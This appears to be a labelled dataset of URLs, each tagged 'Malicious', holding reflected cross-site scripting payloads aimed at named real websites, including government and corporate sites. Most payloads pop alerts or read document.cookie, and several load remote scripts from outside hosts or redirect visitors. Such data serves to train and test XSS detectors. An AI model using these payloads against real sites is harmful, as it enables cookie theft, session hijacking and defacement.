http://www.telonu.com/k10search/entity?etype=201&amp;ekeyword=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;elocation<br>=&amp;op=search&amp;form_id=k10search_entity_form,Malicious
http://www.wen-tech.com/contact.asp?id=10&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarque<br>e%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.taartmeteenlindtje.nl/item.php?id=16%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.piratman.info/projet_x/gallery2/phpinfo.php?a[]=&gt;&lt;script&gt;alert('kabus-kabustr.com');&lt;/scr<br>ipt&gt;,Malicious
http://www.earningswhispers.com/viewprofile.asp?username=jturano7423@yahoo.com}%3c/style%3e%3cscript<br>%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3<br>c/h1%3e%3c/marquee%3e,Malicious
http://www.juniper.net/us/en/search/search.do?searchsubgroup=products-services&amp;qt=%22%3e%3cscript%3e<br>alert(%27xssed%27)%3c/script%3e&amp;submit.x=1&amp;submit.y=9,Malicious
http://s558.photobucket.com/guestlogin?loginform[albumurl]=http://s289.photobucket.com/albums/ll233/<br>&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;ale<br>rt(&quot;xssed%20byazat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20bya<br>zat&quot;)&lt;/script&gt;&amp;loginform[redirectaction]=&amp;loginform[password]=&gt;&lt;script&gt;alert(&quot;xssed')&lt;/script&gt;&amp;login<br>=&gt;&lt;script&gt;alert(&quot;xssed&quot;)&lt;/script&gt;,Malicious
http://www.1800goguard.com/search/results.php?criteria=&lt;/h2&gt;&lt;script&gt;alert('xss%20by%20mrdoug')&lt;/scri<br>pt&gt;&lt;font%20size=7%20color=red&gt;xss%20by%20mrdoug&lt;/font&gt;,Malicious
http://inteltransport.e-transport.gov.gr/error.asp?errormessage=%3cscript%3ealert%28string.fromcharc<br>ode%2883%2c116%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est<br>%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.sg.maotdr.gov.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.dominioncity.org/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.hessco.com/storefront/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unit<br>y)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.digra.org/dl/export_endnote?chid=05164.35393%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://www.forestry-suppliers.com/search.asp?stext==&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.dunkelsteinerwald.at/neu//start.cfm?aktuellname=home%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e&amp;cfid=5191416&amp;cftoken=59fd7af8ca095%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3ef89-567f88b2-40f4-4598-ca3bb3933ca6a30e,Malicious
http://www.cdi.ensp.unl.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmc<br>ols=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://jobs.skype.com/applyfor.html?position=1%3cscript%3ealert(document .cookie);%3c/script%3e,Malicious
http://www.radio24.ilsole24ore.com/main.php?dirprog=%22%3e%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e,Malicious
http://www.faa.gov/search/?q=%22%2f%3e%3ciframe+src%3dhttp%3a%2f%2fhellboundhackers.org%3e%3c%2fifra<br>me%3e%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fxss.js%3f,Malicious
http://www.yesser.gov.sa/custompages/rssfeed.aspx?src=<script>alert('nemer al nemer must be free')</script>,Malicious
http://fourkornerz.com/gb/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kesap.gov.tr/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.stpv.ch/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.jarchy.ir/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://premier.intel.com/scripts-quad/aa_faq.asp?stype=beginsecure&amp;sprocess_name=&quot;&gt;&lt;script&gt;alert('x<br>ss')&lt;/script&gt;,Malicious
http://evite.myway.com/app/invitations/create/event.do?isnew=false'&amp;template=birthday_cheers%22%3e'%<br>3e%22%3c'%3c%3c%22'%3e%22%3e'%3e%3c/script%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/scr<br>ipt%3e,Malicious
http://www.moh.gov.kh/index.php?cmd=search&amp;text_search=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3<br>e,Malicious
http://www.leet.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%3<br>1%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%62%79<br>%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e+falke&amp;c=1&amp;p=1&amp;r=1191704867266,Malicious
"http://is.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://benq.it/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ttdaren.gov.tw/daren/instpage.php?r=&amp;w=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;h=&lt;script<br>&gt;alert(document.cookie);&lt;/script&gt;&amp;url=google.com&gt;&lt;/iframe&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.footjoy.jp/search.asp?q=%22%3e%27%3e%22%3c%27%3c%3cscript%3e%3c%2fscript%3e%27%25%3c%27%3<br>e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e,Malicious
http://cafenews.allblog.net/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%<br>69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%3<br>1%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35<br>%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://money.cnn.com/quote/lookup/index.html?symbtype=0&amp;symb=%22%3e%3cscript%3ealert%281%29%3c%2fscr<br>ipt%3e,Malicious
http://www.podclass.com/podclass/course/search.php?tag=%3c%3cscript%3ealert(%22resistance%22);//%3c%<br>3c/script%3e,Malicious
http://www.fr.ricardo.ch/form/viewimage.asp?auctionnr=527941736%3c/title%3e%3cscript%3ealert('airrox<br>ssed');%3c/script%3e&amp;curimgvers=0&amp;imgcount=5&amp;rank=1,Malicious
http://chinese.wsj.com/gb/s-result.asp?keyword=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cma<br>rquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.floodmaps.fema.gov/fhm/scripts/newsview2.asp?act=profile&amp;id=94&amp;state=kansas&amp;stnum=&quot;&gt;&lt;scri<br>pt&gt;alert(&quot;daimon&quot;)&lt;/script&gt;,Malicious
http://www.myvideo.de/?unique_form%5b9508997c%5d=9508997c&amp;challenge=af7282d8831c722adaaae39366dc772a<br>&amp;response=&amp;mv_login_box=login_user_inline&amp;action=%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ea<br>lert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e%3d%26%7b%7d&amp;function=mv_video_box&amp;log<br>in_username=&amp;login_password=&amp;login_save=yes&amp;submit=login,Malicious
https://secure.eluxury.com/secure/account/registration1.jhtml?nextpage=%22%3e%3cscript%3ealert(%22xs<br>s%22)%3c/script%3e&amp;_requestid=163562,Malicious
http://portuguesa.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/<br>script%3e,Malicious
http://chealth.canoe.ca/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20enco<br>re%20!%22)%3c/script%3e,Malicious
http://www.yenidownload.com/ara.asp?kelime=&lt;img<br>src=&quot;http://img61.imageshack.us/img61/4632/26vrul2.jpg&quot;&gt;,Malicious
http://linkuj.cz/?id=show&amp;par=&amp;typ=1&amp;viewnr=%22%3cmarquee%3e%3cfont%20color=red%3erubberduck%3c/font<br>%3e%3c/marquee%3e,Malicious
http://marketing.philly.monster.com/send/?url=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script<br>%3e,Malicious
http://www.thedjlist.com/login.php?scen=a%3a1%3a{i%3a0%3bi%3a75%3b}&amp;ref='&gt;&lt;script&gt;alert(document.coo<br>kie);&lt;/script&gt;,Malicious
http://www.pso-und-haut.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pressetext.de/index.mc?channel=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://usenet.mail2web.com/cgi-bin/dnewsweb.exe?cmd=article&amp;group=%22%3e%3cscript%3ealert(/xss%20by%<br>20fugitif/)%3c/script%3e,Malicious
http://www.persistentsys.com/searchresult/tabid/37/default.aspx?&amp;word=h&quot;&gt;&lt;script&gt;alert('xssed by<br>sandeep kamble')&lt;/script&gt;,Malicious
http://dachshundfarm.com/df/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.needforspeed.com/undercover/media.action?id=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83)<br>)&lt;/script&gt;",Malicious
http://www.diyarbakir-cevreorman.gov.tr/diyar/resim.php?resimno=&lt;script&gt;alert(1)&lt;/script&gt;&lt;iframe%20s<br>rc=&quot;http://www.xssed.com&quot;&gt;,Malicious
http://ms133.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://subscribe.ru/search/?q=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmar<br>quee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(133<br>7)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;where=all,Malicious
http://www.avcibayram.com/igallery34/login.asp?n=/igallery34/igallery.asp&amp;d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://link.tool.ms/new.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://login.kataweb.it/registrazione/newsletter/utenteregistrato.jsp?origin=%22%3e%3cscript%3ealert<br>%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://www.ash-grey.com/a-news232/a-news.cgi?date=2007.08.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3<br>e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c<br>%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%<br>31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://visasearch.visa.com/usasearch/query.html?qt=%27%3balert%28string.fromcharcode%2888%2c83%2c83%<br>29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromc<br>harcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%<br>3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscrip<br>t%3e&amp;col=usa&amp;qs=&amp;ws=0&amp;st=1&amp;style=usa&amp;x=11&amp;y=7,Malicious
http://www.hurriyetusa.com/haber/yorumlar.asp?oku=11244&amp;yaz=http://www.luksus-poolhuse.dk/sommerhus-<br>omraade.asp?sted=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:<br>(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.bestdealmagazines.com/title.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.ghanaculture.gov.gh/index1.php?linkid=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.steelmodels.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b%3<br>c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.umoncton.ca/google/?cx=015502390780218832549%3au-li9q5eugg&amp;cof=forid%3a11&amp;q=/&quot;&gt;&lt;script&gt;al<br>ert('xss by atm0n3r')&lt;/script&gt;&amp;op.x=34&amp;op.y=5&amp;form_id=google_cse_results_searchbox_form,Malicious
http://nihon.com/search.php?args=qs%3d06oenya4zgjblucri2zo4ltlkn0zhkikpu4lidtpgze6eqcyt6aenabcpafq18<br>_xkwz5gf3-aaqyfx9vwv-c9dsngjypi8cu2etm3fw2y5wokn5lhyf-sowoqs3zvbfl630mt3iwuyb-nzlyqpfqaxxkef1x49mke4<br>t1nuzmbiccj6aaaqn06fcrehzr8ysstxhk8.%2cyt0z&amp;uid=ws1046e96262849f03.94715735&amp;src=&amp;term=%27%3e%22%3e%3<br>cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e&amp;submit=search,Malicious
"http://pastebin.mozilla.org/?help=1&goprivate=/""><script>alert('xss by atm0n3r')</script><scripttype=""text/javascript"" src=""http://yourjavascript.com/27544112151/xss.atmon3r.js""></script>&go=go",Malicious
http://www.safetycenter.navy.mil/services/search-results.cfm?search_criteria=%22%3e%3cscript%3ealert<br>%280%29%3c%2fscript%3e&amp;display=10,Malicious
http://web02.mediasentry.com/prod/mscmessage.asp?message=&lt;iframe<br>src=&quot;http://xssed.com&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(&quot;xss - zj&quot;)&lt;/script&gt;,Malicious
http://reference.aol.com/dictionary?dword=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript<br>%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;lookupbtn=look+up,Malicious
http://www.techweb.com/encyclopedia/defineterm.jhtml?term=%22%3cscript%3ealert(%22found%20by%20hotpo<br>ckets%20of%20backslashsecurity.org%22)%3c/script%3e,Malicious
https://answers.suntrust.com/doc/sn6401.xml?topname=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e,Malicious
http://www.udc-italia.it/?page=front/pageref&amp;pageref=&amp;login=1&amp;page=front/pageref&amp;pageref=//byxados%2<br>2%22%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%22%3e%3cscript%20src=http://www.googlebig.<br>com/x.js%3e%3c/script%3e,Malicious
http://www.izmirtarim.gov.tr/zdefter/mesajlar.asp?ekle=tamam&amp;yazan=&lt;h1&gt;&lt;marquee&gt;by+st@rext&lt;/marquee&gt;<br>&lt;/h1&gt;&lt;script&gt;alert(&quot;st&quot;)&lt;/script&gt;,Malicious
http://hg-2k3-crmsrp01.hartford.gov:8080/ef3/error.jsp?reason=%3cscript%3ealert%28document.cookie%29<br>%3c/script%3e,Malicious
http://jigsaw.w3.org/css-validator/validator?uri=http://kusomiso.com/%22%3e'%3e%3cscript%3ealert(%22<br>kusomiso.com%22)%3c/script%3e,Malicious
http://www.yesilisikehliyet.com/forum2/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://www.tomkane.com/section.php?id=3%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.hobbytalk.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.youjizz.com/search/%22/%3e%3cscript%3ealert%281%29%3c/script%3e-1.html,Malicious
http://www.canalblog.com/public/search/?q=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e,Malicious
http://catalog.belkin.com/iwcatsectionview.process?section_id=%22%3e%3cscript%3ealert(%22stuarty%22)<br>%3c/script%3e,Malicious
http://www.ultimatevacationdestinations.net/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://webftp.dreamhost.com/index.php?state=login_small&amp;state2=admin&amp;go_to_state=%22%3e'%3e%22%3c'%3<br>c%3cscript%3e%3c/script%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e],Malicious
http://mailit.myway.com/emailarticle.jsp?&amp;au='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3<br>c/script%3e&amp;at=my%20way%20-%20celebrity%20gossip,Malicious
http://home.disney.go.com/shopping/index?cmp=%22%3e%3cscript%3ealert(%22infected%22)%3c/script%3e%3c<br>h1%3eccc%3c/h1%3e&amp;att=%22%3e%3cscript%3ealert(%22infected%22)%3c/script%3e%3ch1%3eccc%3c/h1%3e&amp;sourc<br>e=287196,Malicious
http://www.standardchartered.com/pk/search/en/index.html?q=xss%22%3e%22%3e%3ciframe%20src=%22http://<br>www.xssed.com%22%3e%3c/iframe%3e&amp;btng.x=0&amp;btng.y=0&amp;btng=go&amp;entqr=0&amp;ud=1&amp;sort=date%3ad%3al%3ad1&amp;outpu<br>t=xml_no_dtd&amp;oe=utf-8&amp;ie=utf-8&amp;client=result_only&amp;proxystylesheet=result_only%22%3e%3cscript%3ealert<br>%28%27xss%27%29%3c/script%3e&amp;site=pk,Malicious
http://www.showtvnet.com/asx/default1.asp?product=%22%3e%3cscript+src=http://starext.by.ru/lt.js%3e,Malicious
http://www.realtimeworlds.com/index.php?id=4&amp;pid=4&amp;nid=%3cscript%3ealert(document.cookie);%3c/script<br>%3e,Malicious
http://seenonstyle.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.co<br>okie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
"http://rcfn.gov.tw/images/info.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%3cscript%3e<br>alert(document.cookie);%3c/script%3e,",Malicious
http://recherche.fluctuat.net/?q=%3cscript%3ealert%28document.cookie%29;%3c/script%3e,Malicious
http://1.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.environment.gov.pk/site_search.asp?search=%22%3e%3cscript%3ealert%28%27xss+in+government+<br>%21neo%27%29%3c%2fscript%3e&amp;submit=search+%3e%3e&amp;mode=allwords,Malicious
http://somerbuys.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://d.www1.xwjp.com/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
http://www.besteindhoven.nl/?page=en_aboutbest%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.bibliotheekmeierij.nl/index.php?id=439&amp;q=%3cscript%3ealert%28123%29%3c/script%3e&amp;x=12&amp;y=1<br>1,Malicious
http://www.sislibelediyesi.com/basinda/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pixelempireclothing.com/fr/recherche?orderby=position&orderway=desc&search_query=\%22/%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.yunohana.co.jp/kasima/news_kasima/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%2<br>0-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://www.ibge.gov.br/home/pesquisa/pesquisa.php?palavras=%22%3e%3cscript%3ealert%28/xss/%29%3b%3c%<br>2fscript%3e,Malicious
http://goojje.com/s.php?hl=zh-cn&amp;q=hp&amp;q=&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;btng=&amp;#35895;&amp;#2299<br>2;&amp;#19968;&amp;#19979;,Malicious
http://just-in.co.uk/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;st<br>@rext&lt;/h1&gt;,Malicious
"http://www.synology.com/search.php?q=""><script>alert(1)</script>",Malicious
http://www.sxfda.gov.cn:8011/sjk/zhongyao/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/s<br>cript%3e,Malicious
http://www.accuweather.com/world-city-list.asp?partner=accuweather&amp;loccode=%22%3e%3cbody%20onload=al<br>ert(%22by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encor<br>e%20%3c/h2%3e,Malicious
"http://www.europol.eu.int/index.asp?page=';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,8<br>5,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(string.fromcha<br>rcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,<br>32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,8<br>4,89,32,83,85,88))%3c/script%3e",Malicious
http://www.yagmurprensi.net/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://vic.vodafone.com.au/coverage/wa.asp?detail=43%20geraldton%3cscript%3ealert('agd_scorp')%3c/sc<br>ript%3e,Malicious
http://eris.0rn.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://icelefant.ic.funpic.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sbir.nasa.gov/sbirweb/abstracts/search_result.jsp?program=&amp;phase=&amp;progyr=99&amp;st=&amp;center=&amp;firm=<br>&amp;sort=99&amp;sort2=&amp;rec_per_page=%3cscript%3ealert('xss--%5c%22vinnu%5c%22')%3c/script%3e&amp;cur_page=5&amp;sta<br>rt_page=-1,Malicious
http://1.tool.ms/new.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.meteochile.gob.cl/muestra_nota_informativa.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%<br>29;%3c/script%3e,Malicious
http://www.buecher-verwertung.de/home/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://local.thedailystar.com/search.pg?q=%3cscript%3ealert(%22iblaze%22)%3c%2fscript%3e&amp;z=%3cscript<br>%3ealert(%22iblaze%22)%3c%2fscript%3e,Malicious
"http://uk.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.elensisbilisim.com/signinform.php?msg=hacked%20by%20b34tr1b0x%20for%20stardefacer.com&lt;bod<br>y onload=alert(/xss/)&gt;,Malicious
http://www.goingout.ro/wp-content/plugins/comment-rating-pro/ck-processkarma.php?id=16039&amp;action=add<br>&amp;path=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.malargue.gov.ar/contacto.php?seccion=contacto.php?seccion=%3c/title%3e%3cscript%3ealert(4<br>30909610069)%3c/script%3e,Malicious
http://www.fahcsia.gov.au/internet/jennymacklin.nsf/search?searchview&amp;query=%22%3e%27%3e%3cscript%3e<br>alert(123)%3c/script%3e&amp;start=1&amp;count=10&amp;layout=main,Malicious
http://allrecipes.com/search/ingredients.aspx?withterm=&amp;searchin=all&amp;wanted1=%22%3cscript+src%3dhttp<br>://vuln.xssed.net/thirdparty/scripts/hotpockets.js%3e,Malicious
http://www.yst1.go.th/school/yangklang/guestbook/admin.php?id='%3e%22%3e%3ciframe%20src=http://kusom<br>iso.com/xss.html%20%3c,Malicious
http://www.jrc.or.jp/search/search.cgi?q=&amp;q_select='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%<br>3e%3c/script%3e,Malicious
http://www.downloadprofessional.com/search.php?a=reactor&amp;q='&gt;&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.co<br>okie);&lt;/script&gt;,Malicious
http://www.gangvideopro.com/index_it.php?rid=rf15%22%3e%3cscript%3ealert(/www.illegalworld.it/);%3c/<br>script%3e,Malicious
http://www.kitesurfshops.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://muzik.ekolay.net/haber_ara/index.asp?q=msn+almak&amp;exp=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://blog.1-apple.com.tw/anniechen/index.cfm?fuseaction=personarticle&amp;artid=61442&amp;blogcode=&quot;&gt;&lt;/a&gt;&lt;<br>script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;,Malicious
